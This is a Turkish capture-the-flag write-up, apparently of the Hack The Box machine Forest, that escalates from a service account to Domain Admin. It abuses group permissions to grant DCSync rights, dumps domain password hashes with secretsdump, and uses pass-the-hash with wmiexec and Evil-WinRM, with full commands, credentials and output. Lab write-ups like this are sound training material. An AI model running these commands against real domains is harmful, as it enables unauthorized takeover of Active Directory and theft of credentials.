1. svc-alfresco@HTB.LOCAL: Şu anda erişiminiz olan kullanıcı hesabı.
    
    - Bu hesap, **Service Accounts@HTB.LOCAL grubunun bir üyesi.
2. **Service Accounts@HTB.LOCAL:
    
    - Bu grup, **Privileged IT Accounts@HTB.LOCAL grubunun bir üyesi.
3. **Privileged** IT Accounts@HTB.LOCAL:
    
    - Bu grup, Account Operators@HTB.LOCAL grubunun bir üyesi.
4. Account Operators@HTB.LOCAL:
    
    - Bu grup, **Exchange Windows Permissions@HTB.LOCAL grubunun bir üyesi.
5. **Exchange Windows Permissions@HTB.LOCAL:
    
    - Bu grup, Active Directory'de **HTB.LOCAL** domainine yazma yetkisine sahip.
6. **HTB.LOCAL**:
    
    - Domain üzerinde değişiklik yapma yetkisi sayesinde Administrator@HTB.LOCAL hesabına erişebilirsiniz.
    - Bu hesap **Domain Admins@HTB.LOCAL grubunun bir üyesidir, yani en üst düzey yetkilere sahiptir.

### "İki sıçrama" Ne Anlama Geliyor?

Bu terim, erişim sürecindeki kritik adımları ifade eder:

1. **svc-alfresco'dan Privileged IT Accounts'a** erişim sağlama.
    - Örneğin, svc-alfresco'nun şifre bilgileri veya bir grup üyesi olarak sağladığı yetkilerle yukarıdaki gruba erişim kazanabilirsiniz.
2. **Privileged IT Accounts'dan Administrator'a erişim sağlama.**
    - Burada, bir exploit, şifre yakalama, veya grup yetkilerinden faydalanarak en üst seviyeye çıkarsınız.

---



### Path

Şu anki erişimim olan svc-alfresco'dan Domain Admins grubunda bulunan Administrator'a geçmek için iki sıçrama gerekiyor.


### Exchange Windows İzinleri Grubuna Katılın

Kullanıcım, Account Operators'ın bir üyesi olan Privileged IT Account'un bir üyesi olan Service Account'ta olduğu için, temelde kullanıcım Account Operators'ın bir üyesi gibidir. Ve Account Operators, Exchange Windows Permissions grubunda Generic All ayrıcalığına sahiptir. Bloodhound'da kenara sağ tıklayıp help'i seçersem, açılan pencerede bir “Abuse Info” sekmesi görüntüleniyor:

![Pasted image 20250106182642.png](/img/user/resimler/Pasted%20image%2020250106182642.png)

Bu, bunun nasıl kötüye kullanılacağına dair tam bir arka plan veriyor ve aşağı kaydırırsam bir örnek görüyorum:

```
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred
```

Ben de kullanabilirim:

```
net group "Exchange Windows Permissions" svc-alfresco /add /domain
```


#### Grant DCSync Privileges

Şimdi Exchange Windows Permissions grubunun üyelerinin domain üzerinde WriteDacl yetkisine sahip olduğu gerçeğini kullanacağım. Yine help'e baktığımda, çalıştırabileceğim komutları gösteriyor:

```
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLABdfm.a', $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync
```


Bunu yaptıktan sonra, lokal olarak Mimikatz ile ya da Kali kutumdan secretsdump.py ile bir DCSync saldırısı gerçekleştirebilirim, çünkü DCSync yalnızca TCP 445, TCP 135 ve bir TCP RPC portuna (49XXX) erişim gerektirir. (Bunu nasıl bildim? Beyond Root'ta inceleyeceğim.)


### Exploit

#### Timeout

Bu saldırıyı gerçekleştirmeye çalıştığımda, deneme yanılma yöntemi kafamı karıştırdı. Kullanıcımı Exchange Windows Permissions grubuna ekliyor ve gerekli komutları çalıştırıyordum ama işe yaramıyordu. Sonra net user svc-alfreso komutunu çalıştırdım ve artık grupta değildim. Görünüşe göre burada bir temizlik yapılıyor (Beyond Root'ta bundan yararlanacağım), bu yüzden hızlı hareket etmem gerekiyor.

Local olarak çalıştırmak için tek satırlık bir komut oluşturacağım. İlk komut için kimlik bilgilerini iletmeme gerek yok, çünkü bu haklara sahip bir kullanıcı olarak zaten çalışıyorum. Ancak ikinci komut için kimlik bilgilerini iletmem gerekti. Tahminimce, oturum ilk komuttan itibaren yeni grupta olduğumu henüz bilmiyor ve kimlik bilgilerini iletmek bunu yeniliyor.

```
Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco; $username = "htb\svc-alfresco"; $password = "s3rvice"; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
```

Bunu Forest üzerinde çalıştırdığımda hata vermeden geri dönüyor:

```
*Evil-WinRM* PS C:\> Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco; $username = "htb\svc-alfresco"; $password = "s3rvice"; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
```

Ve kullanıcıyı yeni grupta görebiliyorum:

```
*Evil-WinRM* PS C:\> net group 'Exchange Windows Permissions'
Group name     Exchange Windows Permissions
Comment        This group contains Exchange servers that run Exchange cmdlets on behalf of users via the management service. Its members have permission to read and modify all Windows accounts and groups. This group should not be deleted.

Members
-------------------------------------------------------------------------------
svc-alfresco             
The command completed successfully.
```

Ayrıca secretsdump.py dosyasını çalıştırabilir ve hash'leri alabilirim:

```
root@kali# secretsdump.py svc-alfresco:s3rvice@10.10.10.161
Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
...[snip]...
[*] Cleaning up... 
```


### Alternative Tool: Aclpwn

Bu exploit işlemini otomatikleştirecek bir araç var, [aclpwn](https://github.com/fox-it/aclpwn.py). Çalıştırdığımda, ona başlamak istediğim kullanıcıyı ve ne elde etmek istediğimi ( domain access) iletiyorum, o da yolları arıyor, bana hangi yolu kullanacağımı soruyor ve sonra çalıştırıyor:

```
root@kali# aclpwn -f svc-alfresco -t htb.local --domain htb.local --server 10.10.10.161
Please supply the password or LM:NTLM hashes of the account you are escalating from: 
[!] Unsupported operation: GenericAll on EXCH01.HTB.LOCAL (Computer)
[-] Invalid path, skipping
[+] Path found!
Path [0]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]->(SERVICE ACCOUNTS@HTB.LOCAL)-[MemberOf]->(PRIVILEGED IT ACCOUNTS@HTB.LOCAL)-[MemberOf]->(ACCOUNT OPERATORS@HTB.LOCAL)-[GenericAll]->(EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL)-[MemberOf]->(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]->(HTB.LOCAL)
[!] Unsupported operation: GetChanges on HTB.LOCAL (Domain)
[-] Invalid path, skipping
[+] Path found!
Path [1]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]->(SERVICE ACCOUNTS@HTB.LOCAL)-[MemberOf]->(PRIVILEGED IT ACCOUNTS@HTB.LOCAL)-[MemberOf]->(ACCOUNT OPERATORS@HTB.LOCAL)-[GenericAll]->(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]->(HTB.LOCAL)
Please choose a path [0-1] 1
[-] Memberof -> continue
[-] Memberof -> continue
[-] Memberof -> continue
[-] Adding user SVC-ALFRESCO to group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL
[+] Added CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local as member to CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
[-] Re-binding to LDAP to refresh group memberships of SVC-ALFRESCO@HTB.LOCAL
[+] Re-bind successful
[-] Modifying domain DACL to give DCSync rights to SVC-ALFRESCO
[+] Dacl modification successful
[+] Finished running tasks
[+] Saved restore state to aclpwn-20191019-215508.restore
```


### Dump Hashes

Now, I can run `secretsdump.py`:

```
root@kali# secretsdump.py svc-alfresco:s3rvice@10.10.10.161
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
...[snip]...
```


### Shell

Administrator için hash'ler ile wmiexec gibi bir araç ile bağlantı kurabilirim:

```
root@kali# wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 htb.local/administrator@10.10.10.161
Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
htb\administrator
```

Evil-WinRM ile de devam edebilirim:

```
root@kali# ruby /opt/evil-winrm/evil-winrm.rb -i 10.10.10.161 -u administrator -p aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6

Info: Starting Evil-WinRM shell v1.7

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
htb\administrator
```

Her iki durumda da, oradan root.txt dosyasını alabilirim:

```
C:\users\administrator\desktop>type root.txt
f048153f************************
```


## Beyond Root

### DCSync Ports

DCSync saldırısına hangi portların dahil olduğunu merak ettim. Böylece, Wireshark açıkken, kullanıcıma DCSync erişimi vermek için oneliner'ımı çalıştırdım. Sonra tun0 üzerinde bir yakalama başlattım ve secretsdump.py dosyasını çalıştırdım. Tüm hash'ler tamamlandıktan sonra yakalamayı durdurdum.

İstatistikler altında, bunu yükleyen Conversations'ı görmek için bir seçenek var:

![Pasted image 20250106183559.png](/img/user/resimler/Pasted%20image%2020250106183559.png)

Hostumun dört bağlantı başlattığını görebiliyorum, hepsi TCP (aksi takdirde UDP'nin ardından bir numara olurdu). İkisi 445'e, biri 135'e ve biri de 49667'ye. Tüm bu portlar nmap'te açıktı.

135'e olan bağlantılar sadece bir sonraki bağlanmam gereken RPC portunu bildirmek içindi. Bu portu filtrelersem (tcp.port == 135), bağlantının kurulduğunu görebiliyorum ve kaldırılmadan önceki son pakette, IP ve port dahil olmak üzere nasıl bağlanılacağı hakkında bilgi var:

![Pasted image 20250106183640.png](/img/user/resimler/Pasted%20image%2020250106183640.png)

### Cleanup Script

svc-alfresco kullanıcısını ekledikten sonra gruplardan kaldırılmasıyla ilgili sorunlar yaşadım. Administrator'ın Documents klasöründe aşağıdaki script'i buldum:

```
:\users\administrator\documents>type revert.ps1
Import-Module C:\Users\Administrator\Documents\PowerView.ps1

$users = Get-Content C:\Users\Administrator\Documents\users.txt

while($true)

{
    Start-Sleep 60

    Set-ADAccountPassword -Identity svc-alfresco -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "s3rvice" -Force)

    Foreach ($user in $users) {
        $groups = Get-ADPrincipalGroupMembership -Identity $user | where {$_.Name -ne "Service Accounts"}

        Remove-DomainObjectAcl -PrincipalIdentity $user -Rights DCSync

        if ($groups -ne $null){
            Remove-ADPrincipalGroupMembership -Identity $user -MemberOf $groups -Confirm:$false
        }
    }
}
```


Şu işlemleri döngü halinde yapıyor:

1. 60 saniye bekliyor.
2. **svc-alfresco** kullanıcısının şifresini "s3rvice" olarak sıfırlıyor.
3. **Administrators** belgeler klasöründeki **users.txt** dosyasındaki her kullanıcı üzerinde döngü yapıyor:
    - Her kullanıcı için DCSync yetkilerini kaldırıyor.
    - Kullanıcıyı "Service Accounts" olarak adlandırılmamış tüm gruplardan çıkarıyor.

Bu script, oturum açıldığında veya sistem başlatıldığında çalışmak zorunda. Tüm zamanlanmış görevlerin bir listesini alırsam, tam en üstte potansiyel bir görev görüyorum:

```
C:\>schtasks /query /fo TABLE

Folder: \
TaskName                                 Next Run Time          Status         
======================================== ====================== ===============
restore                                  N/A                    Running        
...[snip]...
```

Detayların sorgulanması bunu doğruluyor:

```
C:\>schtasks /query /tn restore /v /fo list

Folder: \
HostName:                             FOREST
TaskName:                             \restore
Next Run Time:                        N/A
Status:                               Running
Logon Mode:                           Interactive/Background
Last Run Time:                        10/19/2019 9:22:00 AM
Last Result:                          267009
Author:                               HTB\Administrator
Task To Run:                          powershell.exe -ep bypass C:\Users\Administrator\Documents\revert.ps1
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A
```

Script sistem başlangıcında çalışır, sürekli olarak sıfırlanır ve uyur.
